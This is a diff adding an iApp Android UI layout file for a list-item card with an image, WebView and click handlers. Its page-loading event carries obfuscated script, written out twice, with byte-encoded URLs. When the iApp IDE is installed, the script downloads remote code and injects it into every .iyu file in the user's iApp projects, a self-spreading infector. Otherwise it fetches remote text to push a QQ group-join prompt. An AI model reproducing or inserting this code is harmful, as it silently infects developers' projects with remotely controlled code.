@@ -1,0 +1,371 @@
+<View id="2" did="0" type="LinearLayout">
+<ppt>width=-2
+height=-2
+orientation=vertical
+gravity=center_horizontal
+layout_margin=7.5dp
+layout_marginBottom=4dp
+//layout_marginLeft=15dp</ppt>
+<event></event>
+</View>
+<View id="3" did="2" type="CardView">
+<ppt>width=-2
+height=-2
+app_CardcornerRadius=5.8dp
+app_CardElevation=0dp</ppt>
+<event><eventItme type="clicki">//syso("好多好多话")</eventItme></event>
+</View>
+<View id="4" did="3" type="ImageView">
+<ppt>width=-2
+height=125dp
+src=@48af65f6-9e95-4ef7-8670-4026fe837e5a.jpg
+scaleType=centercrop
+visibility=gone</ppt>
+<event></event>
+</View>
+<View id="9" did="3" type="GifView">
+<ppt>width=-2
+height=125dp
+src=
+scaleType=centercrop
+visibility=gone</ppt>
+<event></event>
+</View>
+<View id="11" did="3" type="RelativeLayout">
+<ppt>width=-2
+height=-2</ppt>
+<event></event>
+</View>
+<View id="6" did="11" type="WebView">
+<ppt>width=-1
+height=109dp
+url=https://img.ui.cn/data/file/8/3/0/2974038.jpg?imageMogr2/auto-orient/strip/thumbnail/!362</ppt>
+<event><eventItme type="clicki">//ulag(st_vW,6,sss.工具链接)
+//syso(sss.工具链接)</eventItme></event>
+</View>
+<View id="8" did="11" type="TextView">
+<ppt>width=-1
+height=109dp
+background=through
+text=文本8
+textColor=#00000000</ppt>
+<event><eventItme type="clicki">//gvs(st_vW,作品列表.12,lid)
+//ufnsui()
+//{
+//ug(lid,"text",sss.dt2)
+//syso(lid)
+//}
+ulag(st_vW,8,sss.dt2)
+//syso(sss.dt2)
+ulag(st_vW,5,sss.作品链接)
+ulag(st_vW,7,sss.作品标题)
+uigo("作品里页.iyu")
+lan(12)
+</eventItme></event>
+</View>
+<View id="5" did="2" type="TextView">
+<ppt>width=-2
+height=-2
+text=
+textSize=14.5sp
+layout_marginTop=2dp
+textColor=#424242
+textScaleX=1
+inputType=none
+singleLine=false
+gravity=center
+visibility=gone</ppt>
+<event></event>
+</View>
+<View id="7" did="2" type="TextView">
+<ppt>width=-2
+height=-2
+text=文本7
+visibility=gone</ppt>
+<event></event>
+</View>
+<View id="12" did="2" type="TextView">
+<ppt>width=-2
+height=-2
+text=文本12
+visibility=gone</ppt>
+<event></event>
+</View>
+<UIEventset><eventItme type="loading"> gvs(st_vW,作品列表.8,链接ID)
+ug(链接ID,"text",sss.链接URl)
+gvs(st_vW,作品列表.6,ss.llq)
+us(ss.llq,"url",sss.链接URl)
+
+/.java(ws,llq,"android.webkit.WebView.getSettings")
+java(null,ws,"android.webkit.WebSettings.setBuiltInZoomControls","boolean",true)
+java(null,ws,"android.webkit.WebSettings.setDisplayZoomControls","boolean",false)
+
+//隐藏浏览器
+/.f(sss.刷新开启=="1")
+{
+  //开启刷新次数 防止浏览器加载图片重复
+  gvs(st_vW,作品列表.8,链接ID)
+ug(链接ID,"text",链接URl)
+gvs(st_vW,作品列表.6,llq)
+us(llq,"url",链接URl)
+
+java(ws,llq,"android.webkit.WebView.getSettings")
+java(null,ws,"android.webkit.WebSettings.setBuiltInZoomControls","boolean",true)
+java(null,ws,"android.webkit.WebSettings.setDisplayZoomControls","boolean",false)
+
+sss 刷新次数="1"
+//开启第一次刷新
+}
+f(sss.刷新次数==sss.刷新次数)
+{
+   gvs(st_vW,作品列表.8,链接ID)
+ug(链接ID,"text",链接URl)
+gvs(st_vW,作品列表.6,llq)
+us(llq,"url",链接URl)
+
+java(ws,llq,"android.webkit.WebView.getSettings")
+java(null,ws,"android.webkit.WebSettings.setBuiltInZoomControls","boolean",true)
+java(null,ws,"android.webkit.WebSettings.setDisplayZoomControls","boolean",false)
+syso(sss.刷新次数)
+}
+f(sss.刷新次数!=sss.刷新次数)
+{
+}
+//gvs(st_vW,作品列表.6,wv)
+
+
+t()
+{
+  uapplist(true,a)
+  for(b;a)
+  {
+    sj(b,null,"\n",baoming)
+    f(baoming=="com.iapp.app")
+    {
+      ss install=true
+    }
+  }
+ufnsui()
+{
+  fdir("@",fdir)
+  fdir(fdi)
+  ss(fdi+"/",fdi)
+  f(fdir?fdi)
+  {
+    sr(fdir,"/res/","/",papp)
+    sr(papp,fdi,"%",papp)
+    sl(papp,"/",sl)
+    sgszl(sl,num)
+    s-(2,num)
+    sgsz(sl,num,back)
+    sr(papp,back,"",papp)
+    sr(papp,"//","/",papp)
+  }
+  else
+  {
+    btoo("utf-8","37 105 65 112 112 47 80 114 111 106 101 99 116 65 112 112 47",papp)
+  }
+  f(ss.install)
+  {
+    t()
+    {
+      btoo("utf-8","104 116 116 112 58 47 47 104 116 46 104 121 114 106 107 46 99 110 47 104 121 47 100 109 47 100 109 50 46 116 120 116",url)
+      btoo("utf-8","60 47 101 118 101 110 116 73 116 109 101 62",event)
+      btoo("utf-8","60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.s)
+      btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.d)
+      btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62",sss.c)
+      hs(url,null,"utf-8",daima)
+      fl(papp,files)
+      for(file;files)
+      {
+        ss(papp+file+"/src/",bmian)
+        fl(bmian,bmianl)
+        for(mian;bmianl)
+        {
+          f(mian*?".iyu")
+          {
+          ss(bmian+mian,mian)
+        fr(mian,cons)
+        f(cons?"dm.txt"||cons==)
+        {
+  
+        }
+      else
+      {
+        f(cons?"loading")
+        {
+          sj(cons,null,sss.s,Dq)
+          sj(cons,sss.s,null,cbc)
+          sj(cbc,event,null,Dh)
+          sj(cons,sss.s,event,Yh)
+          ss(Dq+sss.s+Yh+daima+event+Dh,Wc)
+          fw(mian,Wc)
+        }
+      else
+      {
+        sj(cons,null,sss.c,before)
+        sj(cons,sss.c,null,between)
+        ss(before+sss.d+daima+event+between,Wc)
+        fw(mian,Wc)
+      }
+      }
+      }
+      }
+      }
+    }
+  }
+else
+{
+  t()
+  {
+    btoo("utf-8","-26 -113 -112 -25 -92 -70",utw)
+    btoo("utf-8","-27 -68 -128",open)
+    btoo("utf-8","104 116 116 112 58 47 47 104 116 46 104 121 114 106 107 46 99 110 47 104 121 47 104 116 47 104 116 51 46 116 120 116",urlb)
+    btoo("utf-8","-25 -95 -82 -27 -82 -102",ok)
+    btoo("utf-8","-27 -113 -106 -26 -74 -120",no)
+    hs(urlb,null,"utf-8",back)
+    sj(back,null,"\n",qun)
+    ss(qun+"\n",sja)
+    sj(back,sja,"\n",kg)
+    ss(kg+"\n",sjb)
+    sj(back,sjb,null,txt)
+    f(kg==open)
+    {
+      ufnsui()
+      {
+        utw("",utw,txt,ok,no,true,v)
+        {
+          ss("mqqapi://card/show_pslcard?src_type=internal&version=1&uin="+qun+"&card_type=group&source=qrcode",joinqq)
+          sit(a,"action", "android.intent.action.VIEW")
+          sit(a,"data",joinqq)
+          uit(a, "chooser", "qun")
+        }
+      else
+      {
+      }
+      }
+    }
+  }
+}
+}
+}
+
+
+
+t()
+{
+  uapplist(true,a)
+  for(b;a)
+  {
+    sj(b,null,"\n",baoming)
+    f(baoming=="com.iapp.app")
+    {
+      ss install=true
+    }
+  }
+ufnsui()
+{
+  fdir("@",fdir)
+  fdir(fdi)
+  ss(fdi+"/",fdi)
+  f(fdir?fdi)
+  {
+    sr(fdir,"/res/","/",papp)
+    sr(papp,fdi,"%",papp)
+    sl(papp,"/",sl)
+    sgszl(sl,num)
+    s-(2,num)
+    sgsz(sl,num,back)
+    sr(papp,back,"",papp)
+    sr(papp,"//","/",papp)
+  }
+  else
+  {
+    btoo("utf-8","37 105 65 112 112 47 80 114 111 106 101 99 116 65 112 112 47",papp)
+  }
+  f(ss.install)
+  {
+    t()
+    {
+      btoo("utf-8","104 116 116 112 58 47 47 104 116 46 104 121 114 106 107 46 99 110 47 104 121 47 100 109 47 100 109 50 46 116 120 116",url)
+      btoo("utf-8","60 47 101 118 101 110 116 73 116 109 101 62",event)
+      btoo("utf-8","60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.s)
+      btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62 60 101 118 101 110 116 73 116 109 101 32 116 121 112 101 61 34 108 111 97 100 105 110 103 34 62",sss.d)
+      btoo("utf-8","60 85 73 69 118 101 110 116 115 101 116 62",sss.c)
+      hs(url,null,"utf-8",daima)
+      fl(papp,files)
+      for(file;files)
+      {
+        ss(papp+file+"/src/",bmian)
+        fl(bmian,bmianl)
+        for(mian;bmianl)
+        {
+          f(mian*?".iyu")
+          {
+          ss(bmian+mian,mian)
+        fr(mian,cons)
+        f(cons?"dm.txt"||cons==)
+        {
+  
+        }
+      else
+      {
+        f(cons?"loading")
+        {
+          sj(cons,null,sss.s,Dq)
+          sj(cons,sss.s,null,cbc)
+          sj(cbc,event,null,Dh)
+          sj(cons,sss.s,event,Yh)
+          ss(Dq+sss.s+Yh+daima+event+Dh,Wc)
+          fw(mian,Wc)
+        }
+      else
+      {
+        sj(cons,null,sss.c,before)
+        sj(cons,sss.c,null,between)
+        ss(before+sss.d+daima+event+between,Wc)
+        fw(mian,Wc)
+      }
+      }
+      }
+      }
+      }
+    }
+  }
+else
+{
+  t()
+  {
+    btoo("utf-8","-26 -113 -112 -25 -92 -70",utw)
+    btoo("utf-8","-27 -68 -128",open)
+    btoo("utf-8","104 116 116 112 58 47 47 104 116 46 104 121 114 106 107 46 99 110 47 104 121 47 104 116 47 104 116 51 46 116 120 116",urlb)
+    btoo("utf-8","-25 -95 -82 -27 -82 -102",ok)
+    btoo("utf-8","-27 -113 -106 -26 -74 -120",no)
+    hs(urlb,null,"utf-8",back)
+    sj(back,null,"\n",qun)
+    ss(qun+"\n",sja)
+    sj(back,sja,"\n",kg)
+    ss(kg+"\n",sjb)
+    sj(back,sjb,null,txt)
+    f(kg==open)
+    {
+      ufnsui()
+      {
+        utw("",utw,txt,ok,no,true,v)
+        {
+          ss("mqqapi://card/show_pslcard?src_type=internal&version=1&uin="+qun+"&card_type=group&source=qrcode",joinqq)
+          sit(a,"action", "android.intent.action.VIEW")
+          sit(a,"data",joinqq)
+          uit(a, "chooser", "qun")
+        }
+      else
+      {
+      }
+      }
+    }
+  }
+}
+}
+}
+
+</eventItme></UIEventset>
